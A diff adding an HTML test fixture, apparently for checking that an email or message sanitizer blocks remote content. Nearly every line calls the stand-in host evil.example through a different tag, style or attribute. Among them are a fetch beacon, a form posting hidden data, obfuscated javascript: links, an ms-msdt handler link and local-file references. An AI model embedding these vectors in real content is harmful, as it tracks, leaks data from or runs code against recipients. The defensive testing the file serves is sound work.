@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="refresh" content="0; url=https://evil.example/landing">
+<base href="https://evil.example/base/">
+<link rel="stylesheet" href="https://evil.example/track.css">
+<link rel="preload" as="image" href="https://evil.example/preload.gif">
+<link rel="dns-prefetch" href="//evil.example">
+<style>
+  @import url("https://evil.example/import.css");
+  @font-face { font-family: Track; src: url(https://evil.example/font.woff2); }
+  body { background: url(https://evil.example/body-bg.gif); }
+  .x::after { content: url(https://evil.example/after.gif); }
+</style>
+<script src="https://evil.example/payload.js"></script>
+<script>fetch("https://evil.example/beacon?open=1"); document.write("<img src='https://evil.example/written.gif'>");</script>
+</head>
+<body background="https://evil.example/attr-bg.gif" onload="new Image().src='https://evil.example/onload.gif'">
+<p>VISIBLE-ONE: this message tries every way it knows to phone home.</p>
+<img src="https://evil.example/plain.gif" alt="A remote picture">
+<img src="http://evil.example/insecure.gif">
+<img src="//evil.example/schemeless.gif" alt="schemeless">
+<img src="/relative.gif" alt="relative">
+<img srcset="https://evil.example/set-1x.gif 1x, https://evil.example/set-2x.gif 2x" alt="srcset only">
+<img src="data:image/gif;base64,R0lGODlhAQABAAAAACwAAAAAAQABAAA=" alt="data picture">
+<img src="file:///C:/Users/owner/secret.png" alt="local file">
+<img src="\\evil.example\share\smb.png" alt="network share">
+<img src="cid:not-attached@evil.example" alt="missing part">
+<img src="https://evil.example/pixel.gif" width="1" height="1">
+<img src="https://evil.example/lazy.gif" loading="lazy" style="position:absolute;left:-9999px" alt="off screen">
+<picture><source srcset="https://evil.example/picture-source.webp" type="image/webp"><img src="https://evil.example/picture-fallback.jpg" alt="picture element"></picture>
+<video src="https://evil.example/video.mp4" poster="https://evil.example/poster.jpg" autoplay>VISIBLE-TWO: video fallback text</video>
+<audio src="https://evil.example/audio.mp3" autoplay></audio>
+<object data="https://evil.example/object.swf" type="application/x-shockwave-flash">object fallback</object>
+<embed src="https://evil.example/embed.swf">
+<iframe src="https://evil.example/frame.html">iframe fallback, never shown</iframe>
+<frameset><frame src="https://evil.example/frame2.html"></frameset>
+<svg width="10" height="10"><image href="https://evil.example/svg-image.png" xlink:href="https://evil.example/svg-xlink.png"/><use href="https://evil.example/sprite.svg#a"/></svg>
+<input type="image" src="https://evil.example/input.gif">
+<form action="https://evil.example/collect" method="post"><input type="hidden" name="who" value="owner"><button formaction="https://evil.example/collect2">Send</button></form>
+<table background="https://evil.example/table-bg.gif"><tr><td background="https://evil.example/cell-bg.gif" style="background-image:url('https://evil.example/style-bg.gif');background:#ffeeee url(https://evil.example/shorthand-bg.gif)">VISIBLE-THREE: a cell with backgrounds</td></tr></table>
+<div style="background:url(https://evil.example/div-bg.gif);list-style-image:url(https://evil.example/list.gif);cursor:url(https://evil.example/cursor.cur), auto;border-image:url(https://evil.example/border.png) 30;">VISIBLE-FOUR: a styled block</div>
+<a href="https://evil.example/click">A real link</a>
+<a href="javascript:fetch('https://evil.example/js')">A script link</a>
+<a href="vbscript:msgbox(1)">Another script link</a>
+<a href="data:text/html,<script>location='https://evil.example/data'</script>">A data link</a>
+<a href="file:///etc/passwd">A file link</a>
+<a href="ms-msdt:/id PCWDiagnostic /skip force">A handler link</a>
+<a href="  JAVA&#9;SCRIPT&#58;alert(1)">An obfuscated script link</a>
+<a ping="https://evil.example/ping" href="mailto:someone@elsewhere.example">A mail link with a ping</a>
+<area href="https://evil.example/area" shape="rect" coords="0,0,10,10">
+<bgsound src="https://evil.example/sound.wav">
+<marquee>VISIBLE-FIVE: moving text that does not move</marquee>
+<noscript><img src="https://evil.example/noscript.gif" alt="noscript picture"></noscript>
+<template><img src="https://evil.example/template.gif"></template>
+<math><annotation-xml encoding="text/html"><img src="https://evil.example/mathml.gif" alt="math"></annotation-xml></math>
+<p style="display:none">HIDDEN-ONE</p>
+<!-- <img src="https://evil.example/comment.gif"> -->
+<![CDATA[ <img src="https://evil.example/cdata.gif"> ]]>
+</body>
+</html>
